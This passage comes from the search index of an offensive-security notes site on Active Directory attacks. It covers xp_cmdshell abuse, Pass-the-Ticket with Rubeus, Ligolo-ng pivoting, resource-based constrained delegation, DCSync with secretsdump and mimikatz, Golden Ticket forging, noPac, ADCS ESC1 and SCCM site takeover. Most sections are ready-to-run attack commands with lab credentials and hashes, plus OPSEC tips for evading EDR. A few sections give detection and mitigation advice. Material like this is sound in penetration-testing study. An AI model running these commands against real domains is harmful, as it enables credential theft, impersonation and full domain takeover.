&lt;whateveryouanemdthesession&gt;\n</code></pre></p> <p>Note: We cannot use Register-PSSessionConfiguration from an evil-winrm shell because we won't be able to get the credentials popup. Furthermore, if we try to run this by first setting up a PSCredential object and then attempting to run the command by passing credentials like -RunAsCredential $Cred, we will get an error because we can only use RunAs from an elevated PowerShell terminal.</p>","tags":["AD"]},{"location":"Active%20Directory/4.%20Lateral%20Movement/MSSQL%20Abuse/","title":"MSSQL Abuse","text":"","tags":["Authenticated","Lateral-Movement","Privilege-Escalation","AD"]},{"location":"Active%20Directory/4.%20Lateral%20Movement/MSSQL%20Abuse/#identify","title":"Identify","text":"<p>https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet <pre><code>Import-Module .\\PowerUpSQL.ps1\nGet-SQLInstanceDomain\n</code></pre> Connect - Windows <pre><code>Get-SQLQuery -Verbose -Instance \"host,port\" -username \"domain.local\\\\user\" -password \"password\" -query 'Select @@version'\n</code></pre> Connect - Linux <pre><code>impacket-mssqlclient user:'pass'@&lt;IP&gt; -windows-auth\n</code></pre></p>","tags":["Authenticated","Lateral-Movement","Privilege-Escalation","AD"]},{"location":"Active%20Directory/4.%20Lateral%20Movement/MSSQL%20Abuse/#exploit","title":"Exploit","text":"<p>Run commands with xp_cmdshell <pre><code>SQL&gt; enable_xp_cmdshell\nxp_cmdshell whoami /priv\n</code></pre></p>","tags":["Authenticated","Lateral-Movement","Privilege-Escalation","AD"]},{"location":"Active%20Directory/4.%20Lateral%20Movement/Pass%20The%20Ticket/","title":"Pass The Ticket","text":"","tags":["Authenticated","Elevated","Kerberos","Lateral-Movement","AD","type/technique","tactic/TA0008","technique/T1550003","stage/lateral-movement","os/windows","tool/rubeus","tool/klist"]},{"location":"Active%20Directory/4.%20Lateral%20Movement/Pass%20The%20Ticket/#technique","title":"Technique","text":"<p>Pass-the-Ticket (PtT) is a lateral movement technique that uses a stolen Kerberos ticket to authenticate to systems and access resources as the impersonated user. This attack bypasses the need to extract credentials from protected processes like LSASS, making it effective in hardened environments where credential dumping is monitored or prevented.</p> <p>The attack leverages a stolen Ticket Granting Ticket (TGT) or a service ticket (TGS). An attacker can use this ticket from a different machine to request new service tickets from the Domain Controller and gain access to network resources, effectively impersonating the user without ever knowing their password.</p>","tags":["Authenticated","Elevated","Kerberos","Lateral-Movement","AD","type/technique","tactic/TA0008","technique/T1550003","stage/lateral-movement","os/windows","tool/rubeus","tool/klist"]},{"location":"Active%20Directory/4.%20Lateral%20Movement/Pass%20The%20Ticket/#prerequisites","title":"Prerequisites","text":"<p>Access Level: Administrative rights are required on the source machine to dump Kerberos tickets from memory, as they belong to other users' logon sessions.</p> <p>System State: The attacker must have a foothold on a domain-joined machine where a target user is currently logged in or has an active Kerberos ticket cached.</p> <p>Information: The attacker needs to identify a valid Kerberos ticket in memory to steal.</p> <p>Misc: Your system time must be synced with the DC. If your time is too skewed, the ticket will be considered invalid.</p>","tags":["Authenticated","Elevated","Kerberos","Lateral-Movement","AD","type/technique","tactic/TA0008","technique/T1550003","stage/lateral-movement","os/windows","tool/rubeus","tool/klist"]},{"location":"Active%20Directory/4.%20Lateral%20Movement/Pass%20The%20Ticket/#considerations","title":"Considerations","text":"<p>Impact</p> <p>Successful PtT allows an attacker to move laterally across the network and access any resources the impersonated user has permissions for. If the stolen ticket belongs to a Domain Administrator, the attacker gains full control over the domain.</p> <p>DANGER</p> <p>Sacrificial Processes: It is critical to inject stolen tickets into a \"sacrificial process\" rather than overwriting the ticket of an existing logon session. Overwriting a ticket for a critical process (like <code>SYSTEM$</code>) or a service can cause an outage, as the service may not be able to re-authenticate until it is restarted. Using a sacrificial process creates a new, isolated logon session for the ticket. While this is safer, creating a new logon session (<code>LOGON_TYPE = 9</code>) is an Indicator of Compromise (IOC) that can be detected.</p> <p>OPSEC</p> <ul> <li> <p>Tooling Footprint: Executing tools like <code>Rubeus.exe</code> from disk creates obvious IOCs (process name, file hash, arguments) for EDR. Prefer in-memory execution or integrated C2 capabilities to avoid detection.</p> </li> <li> <p>Logon Artifacts: Creating a sacrificial process generates a detectable <code>LOGON_TYPE = 9</code> event. This is a direct trade-off between preventing service outages and maintaining stealth.</p> </li> <li> <p>Suspicious Service Requests: After passing a ticket, the host's requests for new service tickets can appear abnormal.</p> </li> </ul>","tags":["Authenticated","Elevated","Kerberos","Lateral-Movement","AD","type/technique","tactic/TA0008","technique/T1550003","stage/lateral-movement","os/windows","tool/rubeus","tool/klist"]},{"location":"Active%20Directory/4.%20Lateral%20Movement/Pass%20The%20Ticket/#execution","title":"Execution","text":"<p>Create a Sacrificial Process</p> <p>To avoid overwriting existing tickets and potentially causing service disruptions, create a new process with its own logon session. Rubeus can create this process, which will be used for ticket injection. The <code>/show</code> flag makes the new command window visible.</p> <p><pre><code>.\\Rubeus.exe createnetonly /program:\"C:\\Windows\\System32\\cmd.exe\" /show\n</code></pre> The output provides the Logon ID (LUID) of the new session. Save this for later.</p> <p>Identify TIckets (In original session)</p> <pre><code>.\\Rubeus.exe triage\n</code></pre> <p>Once a target ticket is identified (e.g., a ticket for <code>admin@DOMAIN.LOCAL</code> with the service <code>krbtgt</code>), save its LUID.</p> <p>Dump the target ticket with its LUID (In original session)</p> <pre><code>.\\Rubeus.exe dump /luid:0x89275d /service:krbtgt /nowrap\n</code></pre> <p>This command outputs the user's ticket in Base64 format.</p> <p>Pass the Ticket (PTT) (In Sacrificial Process)</p> <p>inject the stolen ticket into the current logon session. The <code>/ptt</code> flag passes the ticket directly into memory.</p> <pre><code>Rubeus.exe renew /ticket:doIFVjCCBVKgAwIBBaEDA&lt;SNIP&gt; /ptt\n</code></pre> <p>Rerun <code>klist</code> to confirm that the ticket for the target user is now in our current session.</p> <pre><code>klist\n</code></pre> <p>The output should now show the impersonated user's ticket. With this ticket in memory, any network action you perform will be on behalf of that user. For example, accessing a Domain Controller's C$ share.</p> <p><pre><code>dir \\\\dc01\\c$\n</code></pre> Windows will automatically use the injected TGT to request a TGS for the <code>cifs/dc01</code> service and grant you access.</p>","tags":["Authenticated","Elevated","Kerberos","Lateral-Movement","AD","type/technique","tactic/TA0008","technique/T1550003","stage/lateral-movement","os/windows","tool/rubeus","tool/klist"]},{"location":"Active%20Directory/4.%20Lateral%20Movement/Pass%20The%20Ticket/#cleanup-considerations","title":"Cleanup Considerations","text":"<p>Terminating the sacrificial process will destroy the associated logon session and the injected tickets.</p>","tags":["Authenticated","Elevated","Kerberos","Lateral-Movement","AD","type/technique","tactic/TA0008","technique/T1550003","stage/lateral-movement","os/windows","tool/rubeus","tool/klist"]},{"location":"Active%20Directory/4.%20Lateral%20Movement/Pass%20The%20Ticket/#detection-mitigation","title":"Detection &amp; Mitigation","text":"","tags":["Authenticated","Elevated","Kerberos","Lateral-Movement","AD","type/technique","tactic/TA0008","technique/T1550003","stage/lateral-movement","os/windows","tool/rubeus","tool/klist"]},{"location":"Active%20Directory/4.%20Lateral%20Movement/Pass%20The%20Ticket/#detection","title":"Detection","text":"<ul> <li> <p>Monitor for process creation events associated with <code>LOGON_TYPE = 9</code> (New Credentials), which tools like Rubeus use to create sacrificial processes.</p> </li> <li> <p>Audit for Kerberos service ticket requests (Event ID 4769) originating from unusual hosts or at anomalous times.</p> </li> <li> <p>Network traffic analysis can potentially identify a ticket being used from an IP address not associated with the legitimate user.</p> </li> </ul>","tags":["Authenticated","Elevated","Kerberos","Lateral-Movement","AD","type/technique","tactic/TA0008","technique/T1550003","stage/lateral-movement","os/windows","tool/rubeus","tool/klist"]},{"location":"Active%20Directory/4.%20Lateral%20Movement/Pass%20The%20Ticket/#mitigation","title":"Mitigation","text":"<ul> <li> <p>Limit Admin Privileges: Restricting local administrator rights prevents attackers from being able to dump tickets from other users' sessions on a machine.</p> </li> <li> <p>Protected Users Group: Add high-privilege accounts to the \"Protected Users\" group in Active Directory. This enforces security controls that make it much harder to steal or use their tickets, such as disabling credential caching.</p> </li> <li> <p>Microsoft Defender for Identity: Can detect anomalous ticket usage across the network, which is a key indicator of a Pass-the-Ticket attack.</p> </li> </ul>","tags":["Authenticated","Elevated","Kerberos","Lateral-Movement","AD","type/technique","tactic/TA0008","technique/T1550003","stage/lateral-movement","os/windows","tool/rubeus","tool/klist"]},{"location":"Active%20Directory/4.%20Lateral%20Movement/Pivoting/","title":"Pivoting","text":"","tags":["AD"]},{"location":"Active%20Directory/4.%20Lateral%20Movement/Pivoting/#ligolong","title":"LigoloNG","text":"<p>https://github.com/Nicocha30/ligolo-ng</p>","tags":["AD"]},{"location":"Active%20Directory/4.%20Lateral%20Movement/Pivoting/#single-pivot","title":"Single pivot","text":"<p>Attack host: <pre><code>sudo ip tuntap add user kali mode tun ligolo ; sudo ip link set ligolo up\n</code></pre> <pre><code>./proxy -selfcert -laddr 0.0.0.0:443\n</code></pre> add route to new subnet <pre><code>sudo ip route add 172.16.139.0/24 dev ligolo\n</code></pre> Target: <pre><code>agent.exe -connect &lt;attackIP&gt;:443 -ignore-cert\n</code></pre> Attack host: select session <pre><code>session\n</code></pre> add listeners <pre><code>listener_add --addr 0.0.0.0:8080 --to 127.0.0.1:80\nlistener_add --addr 0.0.0.0:8081 --to 127.0.0.1:81\nlistener_add --addr 0.0.0.0:8082 --to 127.0.0.1:82\nlistener_add --addr 0.0.0.0:8083 --to 127.0.0.1:83\nlistener_add --addr 0.0.0.0:8084 --to 127.0.0.1:84\n</code></pre> start tunnel <pre><code>start\n</code></pre></p>","tags":["AD"]},{"location":"Active%20Directory/4.%20Lateral%20Movement/Pivoting/#double-pivot","title":"Double Pivot","text":"<p>Attack host: <pre><code>sudo ip tuntap add user kali mode tun double ; sudo ip link set double up\nsudo ip tuntap add user kali mode tun ligolo ; sudo ip link set ligolo up\n</code></pre> <pre><code>./proxy -selfcert -laddr 0.0.0.0:443\n</code></pre> Target: First pivot callback <pre><code>agent.exe -connect &lt;attackIP&gt;:443 -ignore-cert\n</code></pre> Attack host: Add routes <pre><code>sudo ip route add 172.16.139.0/24 dev ligolo\nsudo ip route add 172.16.210.0/24 dev double\n</code></pre> select session <pre><code>session\n</code></pre> add listener for second pivot <pre><code>listener_add --addr 0.0.0.0:139 --to 127.0.0.1:443\n</code></pre> add normal listeners <pre><code>listener_add --addr 0.0.0.0:8080 --to 127.0.0.1:80\nlistener_add --addr 0.0.0.0:8081 --to 127.0.0.1:81\nlistener_add --addr 0.0.0.0:8082 --to 127.0.0.1:82\nlistener_add --addr 0.0.0.0:8083 --to 127.0.0.1:83\nlistener_add --addr 0.0.0.0:8084 --to 127.0.0.1:84\n</code></pre> start first tunnel <pre><code>start\n</code></pre> Second target: Call back to first pivot host from second <pre><code>agent.exe -connect &lt;targetONE&gt;:139 -ignore-cert\n</code></pre> add listeners to second host <pre><code>listener_add --addr 0.0.0.0:5050 --to 127.0.0.1:50\nlistener_add --addr 0.0.0.0:5051 --to 127.0.0.1:51\nlistener_add --addr 0.0.0.0:5052 --to 127.0.0.1:52\nlistener_add --addr 0.0.0.0:5053 --to 127.0.0.1:53\nlistener_add --addr 0.0.0.0:5054 --to 127.0.0.1:54\n</code></pre> start second tunnell <pre><code>start --tun double\n</code></pre> Verify access <pre><code>nxc smb 172.16.139.10/24 \nnxc smb 172.16.210.0/24\n</code></pre></p>","tags":["AD"]},{"location":"Active%20Directory/4.%20Lateral%20Movement/Pivoting/#proxychains-with-socks-tunnel","title":"proxychains (with SOCKS tunnel)","text":"<p>Start with dynamic SSH port forward <pre><code>ssh -D 9050 user@&lt;jumpIP&gt;\n</code></pre> Check proxychains configuration <pre><code>cat /etc/proxychains.conf\nor\ncat /etc/proxychains4.conf\n</code></pre> Ensure its configured to route over the local forward <pre><code># meanwile\n# defaults set to \"tor\"\nsocks4  127.0.0.1 9050\n</code></pre> prepend <code>proxychains</code> or <code>proxychains4</code> to any command to tunnel the traffic <pre><code>proxychains nmap\nproxychain msfconsole\nproxychains firefox\n</code></pre></p> <p>we can only perform a full TCP connect scan over proxychains. The reason for this is that proxychains cannot understand partial packets. If you send partial packets like half connect scans, it will return incorrect results</p> <pre><code>proxychains nmap -v -Pn -sT &lt;internalIP&gt;\n</code></pre>","tags":["AD"]},{"location":"Active%20Directory/4.%20Lateral%20Movement/Pivoting/#sshuttle","title":"sshuttle","text":"<p>https://github.com/sshuttle/sshuttle</p> <p>specify the option <code>-r</code> to connect to the remote machine with a username and password. Then we need to include the network or IP we want to route through <pre><code>sudo sshuttle -r user@&lt;jumpHost&gt; 172.16.5.0/23 -v \n</code></pre> sshuttle creates an entry in our <code>iptables</code> to redirect all traffic to the 172.16.5.0/23 network through the pivot host. We can now use any tool directly without using proxychains. <pre><code>nmap -v -sV 172.16.5.19 -A -Pn\n</code></pre></p>","tags":["AD"]},{"location":"Active%20Directory/4.%20Lateral%20Movement/Resource-Based%20Constrained%20Delegation/","title":"Resource Based Constrained Delegation","text":"","tags":["Authenticated","Elevated","Kerberos","msDS-AllowedToActOnBehalfOfOtherIdentity","AD"]},{"location":"Active%20Directory/4.%20Lateral%20Movement/Resource-Based%20Constrained%20Delegation/#linux","title":"Linux","text":"","tags":["Authenticated","Elevated","Kerberos","msDS-AllowedToActOnBehalfOfOtherIdentity","AD"]},{"location":"Active%20Directory/4.%20Lateral%20Movement/Resource-Based%20Constrained%20Delegation/#with-nxc","title":"With nxc","text":"<p>impersonate administrator given <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> is set on account we control <pre><code>nxc smb 192.168.56.11 -u jon.snow -p iknownothing --delegate Administrator\n</code></pre></p>","tags":["Authenticated","Elevated","Kerberos","msDS-AllowedToActOnBehalfOfOtherIdentity","AD"]},{"location":"Active%20Directory/4.%20Lateral%20Movement/Resource-Based%20Constrained%20Delegation/#with-impacket","title":"With impacket","text":"<p>Add computer you control <pre><code>impacket-addcomputer -computer-name 'rbcd-test$' -computer-pass 'Megaman!1' -dc-ip 192.168.0.100 its-piemonte.local/tantani:'AAAAaaaa!1'\n</code></pre> example with hash <pre><code>impacket-addcomputer -computer-name 'rbcd$' -computer-pass 'Password123!' -dc-ip 192.168.146.175 resourced.local/L.Livingstone -hashes :19a3a7550ce8c505c2d46b5e39d6f808\n</code></pre> Configure delegation rights <pre><code>impacket-rbcd -delegate-to 'its-dc1$' -delegate-from 'rbcd-test$' -dc-ip 192.168.0.100 -action write its-piemonte/tantani:'AAAAaaaa!1'\n</code></pre> Example with hash <pre><code>impacket-rbcd -delegate-to 'RESOURCEDC$' -delegate-from 'rbcd$' -dc-ip 192.168.146.175 -action write resourced.local/L.Livingstone -hashes :19a3a7550ce8c505c2d46b5e39d6f808\n</code></pre> Request ticket for admin <pre><code>impacket-getST -spn cifs/its-dc1.its-piemonte.local -impersonate Administrator -dc-ip 192.168.0.100 its-piemonte.local/rbcd-test:'Megaman!1'\n</code></pre> another example <pre><code>impacket-getST -spn cifs/RESOURCEDC.resourced.local -impersonate Administrator -dc-ip 192.168.146.175 resourced.local/rbcd:'Password123!'\n</code></pre> auth with ccache <pre><code>export KRB5CCNAME=Administrator@cifs_RESOURCEDC.resourced.local@RESOURCED.LOCAL.ccache\n</code></pre> PSEXEC IN <pre><code>impacket-psexec Administrator@resourced.local -k -no-pass -dc-ip 192.168.146.175\n</code></pre></p>","tags":["Authenticated","Elevated","Kerberos","msDS-AllowedToActOnBehalfOfOtherIdentity","AD"]},{"location":"Active%20Directory/4.%20Lateral%20Movement/Resource-Based%20Constrained%20Delegation/#windows","title":"Windows","text":"<p>Windows PowerMad has a cmdlet to let us create machine accounts: <pre><code>New-MachineAccount -MachineAccount baud -Password $(ConvertTo-SecureString 'Baudy16!1' -AsPlainText -Force)\n</code></pre> Configure rights (with default AD powershell module) <pre><code>Set-ADComputer its-dc1 -PrincipalsAllowedToDelegateToAccount baud$\n</code></pre> use rubeus <pre><code># get AES:\nRubeus.exe hash /password:Baudy16!1 /user:baud$ /domain:its-piemonte.local\n# get only RC4:\nRubeus.exe hash /password:Baudy16!1\n</code></pre></p> <pre><code>Rubeus.exe s4u /user:baud$ /rc4:8F8172E42D04C1934FECC9E8404E2657 /domain:its-piemonte.local /msdsspn:cifs/its-dc1 /impersonateuser:administrator /ptt\n</code></pre> <p>Convert to auth ticket <pre><code>impacket-ticketConverter rubeusTicket.kirbi impacketTicket.ccache\n</code></pre></p>","tags":["Authenticated","Elevated","Kerberos","msDS-AllowedToActOnBehalfOfOtherIdentity","AD"]},{"location":"Active%20Directory/4.%20Lateral%20Movement/Service%20for%20User%20to%20Self/","title":"Service for User to Self","text":"<p>Get local admin with machine accounts via s4u2self <pre><code>nxc smb 192.168.56.10 -u 'KINGSLANDING$' -H 220fc1990391bdc183d1a68c389c0229 --delegate Administrator --self\n</code></pre></p>","tags":["S4U2Proxy","S4U2Self","AD"]},{"location":"Active%20Directory/5.%20Privilege%20Escalation/Domain/DCSync/","title":"DCSync","text":"","tags":["Authenticated","DS-Replication-Get-Changes","AD"]},{"location":"Active%20Directory/5.%20Privilege%20Escalation/Domain/DCSync/#identify","title":"Identify","text":"<p>Do you control an object with the <code>DS-Replication-Get-Changes</code> ACL?</p>","tags":["Authenticated","DS-Replication-Get-Changes","AD"]},{"location":"Active%20Directory/5.%20Privilege%20Escalation/Domain/DCSync/#exploit","title":"Exploit","text":"<p><pre><code>impacket-secretsdump 'domain.local'/'&lt;user&gt;':'&lt;pass&gt;'@'&lt;DC0IP&gt;'\n</code></pre> From windows <pre><code>runas /netonly /user:DOMAIN\\user powershell\n</code></pre> <pre><code>.\\mimikatz.exe\nprivilege::debug\nlsadump::dcsync /domain:DOMAIN.LOCAL /user:DOMAIN\\administrator\n</code></pre></p>","tags":["Authenticated","DS-Replication-Get-Changes","AD"]},{"location":"Active%20Directory/5.%20Privilege%20Escalation/Domain/Diamond%20Ticket/","title":"Diamond Ticket","text":"<p>Similar to a golden ticket in function but not in form. Instead of forging a new ticket, a diamond ticket is created by modifying fields of a previously granted ticket. This gives some opsec advantages because:</p> <ul> <li>TGS-REQ will have a AS-REQ preceding it.</li> <li>It will have all the correct details from the domain's Kerberos policy because it was issued by the DC</li> </ul>","tags":["Authenticated","Kerberos","OPSEC","Persistence","AD"]},{"location":"Active%20Directory/5.%20Privilege%20Escalation/Domain/Golden%20Ticket/","title":"Golden Ticket","text":"<p>forge a Kerberos Ticket Granting Ticket (TGT) with a domain's KRBTGT account hash, allowing an attacker to impersonate any user including domain admins without needing their credentials.</p>","tags":["Authenticated","Kerberos","Persistence","AD"]},{"location":"Active%20Directory/5.%20Privilege%20Escalation/Domain/Golden%20Ticket/#get-domain-sid","title":"Get domain SID","text":"<p>locally: <pre><code>(Get-ADDomain).DomainSID\n</code></pre> <pre><code>whoami /user # (domain SID is the part before the last hyphen (RID).)\n</code></pre> remotely: <pre><code>nxc ldap &lt;target&gt; -u &lt;user&gt; -p &lt;pass&gt; --sid\n</code></pre></p>","tags":["Authenticated","Kerberos","Persistence","AD"]},{"location":"Active%20Directory/5.%20Privilege%20Escalation/Domain/Golden%20Ticket/#get-krbtgt-account-hash","title":"Get krbtgt account hash","text":"<p>locally - mimikatz <pre><code>lsadump::lsa /inject /name:krbtgt\n</code></pre> remotely - nxc <pre><code>nxc smb &gt;ip&gt; --local-auth -u '' -p '' --lsa --user krbtgt\nnxc smb &lt;dcip&gt; --local-auth -u '' -p '' --ntds --user krbtgt\n</code></pre> remotely - secretsdump <pre><code>impacket-secretsdump user:pass@10.0.0.35\n</code></pre></p>","tags":["Authenticated","Kerberos","Persistence","AD"]},{"location":"Active%20Directory/5.%20Privilege%20Escalation/Domain/Golden%20Ticket/#generate-ticket","title":"Generate ticket","text":"<p>with mimikatz <pre><code>kerberos::golden /User:Administrator /domain:domain.local /sid:&lt;SID&gt; /krbtgt:&lt;krbtgt hash&gt; /id:500 /ptt\n</code></pre> spawn shell with ticket <pre><code>misc::cmd\n</code></pre> Now we can use psexec for a shell anywhere <pre><code>psexec.exe  -accepteula \\\\hostname cmd.exe\n</code></pre> With impacket <pre><code>impacket-ticketer -nthash &lt;krbtgt_ntlm_hash&gt; -domain-sid &lt;domain_sid&gt; -domain &lt;domain_name&gt;  &lt;user_name&gt;\n# OR with aes\npython ticketer.py -aesKey &lt;aes_key&gt; -domain-sid &lt;domain_sid&gt; -domain &lt;domain_name&gt;  &lt;user_name&gt;\n</code></pre> set ticket env var <pre><code>export KRB5CCNAME=&lt;TGS_ccache_file&gt;\n</code></pre> Then you can access anything <pre><code>impacket-psexec &lt;domain_name&gt;/&lt;user_name&gt;@&lt;remote_hostname&gt; -k -no-pass\n</code></pre></p>","tags":["Authenticated","Kerberos","Persistence","AD"]},{"location":"Active%20Directory/5.%20Privilege%20Escalation/Domain/NoPac%20%28SamAccountName%20Spoofing%29/","title":"NoPac (SamAccountName Spoofing)","text":"<p>https://github.com/Ridter/noPac.git</p>","tags":["Authenticated","Domain-Admin","Lateral-Movement","Local","Privilege-Escalation","AD"]},{"location":"Active%20Directory/5.%20Privilege%20Escalation/Domain/NoPac%20%28SamAccountName%20Spoofing%29/#identify","title":"Identify","text":"<p><pre><code>sudo python3 scanner.py domain.local/user:'password' -dc-ip &lt;DCIP&gt; -use-ldap\n</code></pre> nxc: <pre><code>nxc smb &lt;ip&gt; -u 'user' -p 'pass' -M nopac\n</code></pre></p>","tags":["Authenticated","Domain-Admin","Lateral-Movement","Local","Privilege-Escalation","AD"]},{"location":"Active%20Directory/5.%20Privilege%20Escalation/Domain/NoPac%20%28SamAccountName%20Spoofing%29/#exploit","title":"Exploit","text":"<pre><code>sudo python3 noPac.py DOMAIN.LOCAL/user:'pass' -dc-ip &lt;dcip&gt;  -dc-host DC01 -shell --impersonate administrator -use-ldap\n</code></pre> <pre><code>sudo python3 noPac.py DOMAIN.LOCAL/user:'pass' -dc-ip &lt;dcip&gt;  -dc-host DC01 --impersonate administrator -use-ldap -dump -just-dc-user DOMAIN/administrator\n</code></pre> <p>OPSEC: will spawn a SYSTEM shell with smbsexec - shell may establish but defender will likely block further execution.</p>","tags":["Authenticated","Domain-Admin","Lateral-Movement","Local","Privilege-Escalation","AD"]},{"location":"Active%20Directory/5.%20Privilege%20Escalation/Domain/ADCS/ESC1/","title":"ESC1","text":""},{"location":"Active%20Directory/5.%20Privilege%20Escalation/Domain/ADCS/ESC1/#esc1","title":"ESC1","text":"<p>If a template is vulnerable to ESC1, certipy can automatically exploit it. Request the Administrators certificate: <pre><code>certipy-ad req -u &lt;user&gt; -p &lt;password&gt; -dc-ip &lt;IP&gt; -template &lt;Template Name&gt; -upn Administrator@certified.htb -ca &lt;Certificate Authorities&gt; -target dc.domain.local\n</code></pre> Request TGS &amp; NTLM hash with certificate: <pre><code>certipy-ad auth -pfx administrator.pfx -dc-ip &lt;IP&gt;\n</code></pre> Or with NXC: <pre><code>nxc smb &lt;IP&gt; --pfx-cert administrator.pfx -u 'Administrator'\n</code></pre></p>"},{"location":"Active%20Directory/5.%20Privilege%20Escalation/Domain/ADCS/Enumerate%20ADCS/","title":"Enumerate ADCS","text":"","tags":["Authenticated","Certificate-Service","Privilege-Escalation","AD"]},{"location":"Active%20Directory/5.%20Privilege%20Escalation/Domain/ADCS/Enumerate%20ADCS/#identify","title":"Identify","text":"","tags":["Authenticated","Certificate-Service","Privilege-Escalation","AD"]},{"location":"Active%20Directory/5.%20Privilege%20Escalation/Domain/ADCS/Enumerate%20ADCS/#from-windows","title":"From Windows","text":"<p>Is ADCS in use?</p> <p>Run certutil <pre><code>certutil.exe\n</code></pre></p> <p>Check if \u201cCert Publishers\u201d group exists ** <pre><code>net localgroup \"Cert Publishers\"\n</code></pre> Use cerify.exe** <pre><code>.\\Certify.exe find /vulnerable\n</code></pre> Powershell <pre><code>Get-ADObject -LDAPFilter '(&amp;(objectclass=pkicertificatetemplate)(!(mspki-enrollment-flag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-ra-signature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2) (pkiextendedkeyusage=1.3.6.1.5.2.3.4))(mspki-certificate-name-flag:1.2.840.113556.1.4.804:=1))' -SearchBase 'CN=Configuration,DC=Domain,DC=local'\n</code></pre></p>","tags":["Authenticated","Certificate-Service","Privilege-Escalation","AD"]},{"location":"Active%20Directory/5.%20Privilege%20Escalation/Domain/ADCS/Enumerate%20ADCS/#from-linux","title":"From Linux","text":"<p>NetExec <pre><code>nxc ldap &lt;IP&gt; -u \"user\" -p \"Password123!\" -M adcs\n</code></pre> ldap <pre><code>ldapsearch -x -D \"CN=svc-ldapuser,CN=Users,DC=certified,DC=htb\" -w 'SuperSecretPass' -b \"DC=certified,DC=htb\" \"(&amp;(objectClass=pKIEnrollmentService))\" -H ldap://10.129.229.25\n</code></pre> Certipy <pre><code>certipy-ad find -u 'user@domain.local' -p 'Password123!' -dc-ip &lt;IP&gt; -vulnerable -stdout\n</code></pre></p>","tags":["Authenticated","Certificate-Service","Privilege-Escalation","AD"]},{"location":"Active%20Directory/5.%20Privilege%20Escalation/Domain/ADCS/Enumerate%20ADCS/#exploit","title":"Exploit","text":"<ul> <li>ESC1</li> </ul>","tags":["Authenticated","Certificate-Service","Privilege-Escalation","AD"]},{"location":"Active%20Directory/5.%20Privilege%20Escalation/Domain/SCCM/Enumerate%20SCCM/","title":"Enumerate SCCM","text":"<p>aka Microsoft Configuration Manager or MCM, aka Systems Center Configuration Manager, aka Microsoft Endpoint Configuration Manager (MECM).</p>"},{"location":"Active%20Directory/5.%20Privilege%20Escalation/Domain/SCCM/SCCM%20Site%20Takeover%20I/","title":"SCCM Site Takeover I","text":"","tags":["type/technique","tactic/TA0008","tactic/TA0006","technique/T1557001","stage/lateral-movement","os/windows","tool/impacket","tool/ntlmrelayx","tool/petitpotam","tool/mssqlclient","stage/privilege-escalation"]},{"location":"Active%20Directory/5.%20Privilege%20Escalation/Domain/SCCM/SCCM%20Site%20Takeover%20I/#technique","title":"Technique","text":"<p>This takeover technique is possible when the SCCM MSSQL Site Database is hosted on a server separate from the Primary Site Server. In this configuration, the Primary Site Server's machine account (e.g., <code>SCCM01$</code>) is typically a local administrator on the database server.</p> <p>An attacker can coerce authentication from the Primary Site Server (using a tool like PetitPotam) and relay the NTLM session to the MSSQL service on the database server. This grants the attacker <code>dbo</code> (database owner) privileges, allowing them to directly modify the SCCM database tables to add their own account as a Full Administrator, leading to a complete compromise of the SCCM environment.</p>","tags":["type/technique","tactic/TA0008","tactic/TA0006","technique/T1557001","stage/lateral-movement","os/windows","tool/impacket","tool/ntlmrelayx","tool/petitpotam","tool/mssqlclient","stage/privilege-escalation"]},{"location":"Active%20Directory/5.%20Privilege%20Escalation/Domain/SCCM/SCCM%20Site%20Takeover%20I/#prerequisites","title":"Prerequisites","text":"<p>Access Level: An account on the domain. No special or elevated privileges are required to initiate the attack.</p> <p>System State:</p> <ul> <li>The MSSQL Site Database is hosted on a different server than the Primary Site Server.</li> <li>The Primary Site Server's computer account is a local administrator on the database server.</li> <li>The MSSQL service port (typically <code>1433/TCP</code>) is accessible from the attacker's position.</li> <li>SMB Signing must not be required on the target database server.</li> </ul> <p>Information: The IP addresses of the Primary Site Server (to coerce) and the MSSQL server (to relay to).</p>","tags":["type/technique","tactic/TA0008","tactic/TA0006","technique/T1557001","stage/lateral-movement","os/windows","tool/impacket","tool/ntlmrelayx","tool/petitpotam","tool/mssqlclient","stage/privilege-escalation"]},{"location":"Active%20Directory/5.%20Privilege%20Escalation/Domain/SCCM/SCCM%20Site%20Takeover%20I/#considerations","title":"Considerations","text":"<p>Impact</p> <p>A successful attack results in a full takeover of the SCCM site. By gaining Full Administrator rights, an attacker can deploy malicious applications, execute arbitrary scripts as <code>SYSTEM</code> on any managed client, and move laterally throughout the entire network managed by SCCM.</p> <p>OPSEC</p> <ul> <li>Coercion Noise: Authentication coercion attempts (e.g., EFS RPC calls from PetitPotam) are often flagged by modern EDR and security monitoring solutions.</li> <li>Relay Detection: NTLM relay traffic is highly suspicious. A machine account authenticating from an unexpected host (the attacker's relay) is a major red flag.</li> <li>Database Auditing: Direct writes to sensitive SCCM tables like <code>RBAC_Admins</code> are a high-fidelity indicator of compromise if database auditing is enabled.</li> </ul>","tags":["type/technique","tactic/TA0008","tactic/TA0006","technique/T1557001","stage/lateral-movement","os/windows","tool/impacket","tool/ntlmrelayx","tool/petitpotam","tool/mssqlclient","stage/privilege-escalation"]},{"location":"Active%20Directory/5.%20Privilege%20Escalation/Domain/SCCM/SCCM%20Site%20Takeover%20I/#identify","title":"Identify","text":"<p>If <code>CN=System Management,CN=System</code> AD object exists, sccm is installed LDAP also creates new <code>object class</code> entries, such as <code>mssmsmanagementpoint</code> or <code>mssmssite</code>.</p> <p>Using sccmhunter </p> <pre><code>git clone -q https://github.com/garrettfoster13/sccmhunter\ncd sccmhunter\npython3 -m venv .sccmhunter\nsource .sccmhunter/bin/activate\npython3 -m pip install -r requirements.txt\n</code></pre> <p>Sccmhunter will help us extract from each server the following information:</p> <ul> <li>The SCCM site code. </li> <li>Whether the server is a Central Administration Site (CAS). </li> <li>The SMB signing status (helpful in performing later NTLM relay attacks). </li> <li>Whether the server is the SCCM Primary Server or not. </li> <li>Whether it is the SCCM Distribution Point or not. </li> <li>Whether it is the SCCM SMS Provider or not. </li> <li>Whether the WSUS and MSSQL services are running on it or not.</li> </ul> <pre><code>python3 sccmhunter.py find -u &lt;user&gt; -p &lt;pass&gt; -d domain.local -dc-ip &lt;dc-ip&gt;\n</code></pre> <p>This command performs these checks: 1. Checks the DACL for the <code>System Management</code> container manually created during AD schema extension. 2. Checks for published <code>Managment Points</code>. 3. Checks for strings <code>SCCM</code> and <code>MECM</code> in the entire directory.</p> <p>note</p> <p>To see 